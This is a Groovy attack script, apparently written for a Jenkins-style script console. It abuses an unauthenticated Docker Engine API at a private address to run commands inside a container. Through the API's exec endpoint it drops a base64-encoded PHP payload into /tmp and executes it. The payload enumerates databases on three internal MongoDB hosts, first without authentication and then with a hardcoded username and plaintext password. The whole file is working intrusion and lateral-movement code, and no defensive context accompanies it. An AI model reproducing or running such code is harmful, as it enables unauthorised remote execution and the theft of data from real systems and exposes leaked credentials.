import groovy.json.JsonSlurper
import groovy.json.JsonOutput

def dHost = "172.27.140.148"
def dPort = 4243
def cid = "5b32e909c295"

def phpB64 = java.util.Base64.encoder.encodeToString('''<?php
$creds = ["appsears","S34rSu64RD0Jhy63"];
$hosts = ["172.26.84.132:27020","172.26.84.132:27021","172.26.84.132:27017"];

foreach($hosts as $h){
    echo "=== $h SIN AUTH ===\n";
    try {
        $m=new MongoDB\\Driver\\Manager("mongodb://$h");
        $cmd=new MongoDB\\Driver\\Command(["listDatabases"=>1,"filter"=>["name"=>['$ne'=>'admin','local'],"name"=>['$not'=>['$regex'=>'^(admin|local|config)$']]]]);
        $r=$m->executeCommand("admin",$cmd);
        $r->setTypeMap(["root"=>"array","array"=>"array"]);
        $arr=iterator_to_array($r);
        if(isset($arr[0]['databases'])){
            echo "DBs found: ".count($arr[0]['databases'])."\n";
            foreach($arr[0]['databases'] as $db){echo "  - ".$db['name']." (".$db['sizeOnDisk']." bytes)\n";}
        } else {
            echo "Raw: ".json_encode($arr[0])."\n";
        }
    } catch(Exception $e) {
        echo "FAIL: ".$e->getMessage()."\n";
    }
    echo "\n=== $h CON appsears ===\n";
    try {
        $m2=new MongoDB\\Driver\\Manager("mongodb://$creds[0]:$creds[1]@$h");
        $cmd2=new MongoDB\\Driver\\Command(["listDatabases"=>1]);
        $r2=$m2->executeCommand("admin",$cmd2);
        $r2->setTypeMap(["root"=>"array","array"=>"array"]);
        $arr2=iterator_to_array($r2);
        if(isset($arr2[0]['databases'])){
            echo "DBs found: ".count($arr2[0]['databases'])."\n";
            foreach($arr2[0]['databases'] as $db){echo "  - ".$db['name']."\n";}
        }
    } catch(Exception $e) {
        echo "FAIL: ".$e->getMessage()."\n";
    }
    echo "\n";
}
?>'''.getBytes("UTF-8"))

def url1 = new URL("http://${dHost}:${dPort}/containers/${cid}/exec")
def c1 = url1.openConnection()
c1.setRequestMethod("POST")
c1.setDoOutput(true)
c1.setRequestProperty("Content-Type", "application/json")
c1.setConnectTimeout(5000)
c1.setReadTimeout(30000)
def b1 = JsonOutput.toJson([AttachStdout: true, AttachStderr: true, Cmd: ["bash", "-c", "echo ${phpB64} | base64 -d > /tmp/mongo2.php && php /tmp/mongo2.php"]])
c1.outputStream.write(b1.bytes)
c1.outputStream.flush()
def r1 = new JsonSlurper().parseText(c1.inputStream.text)
def eid1 = r1.Id

def su1 = new URL("http://${dHost}:${dPort}/exec/${eid1}/start")
def sc1 = su1.openConnection()
sc1.setRequestMethod("POST")
sc1.setDoOutput(true)
sc1.setRequestProperty("Content-Type", "application/json")
sc1.setConnectTimeout(5000)
sc1.setReadTimeout(45000)
sc1.outputStream.write('{"Detach":false,"Tty":true}'.bytes)
sc1.outputStream.flush()
println sc1.inputStream.text
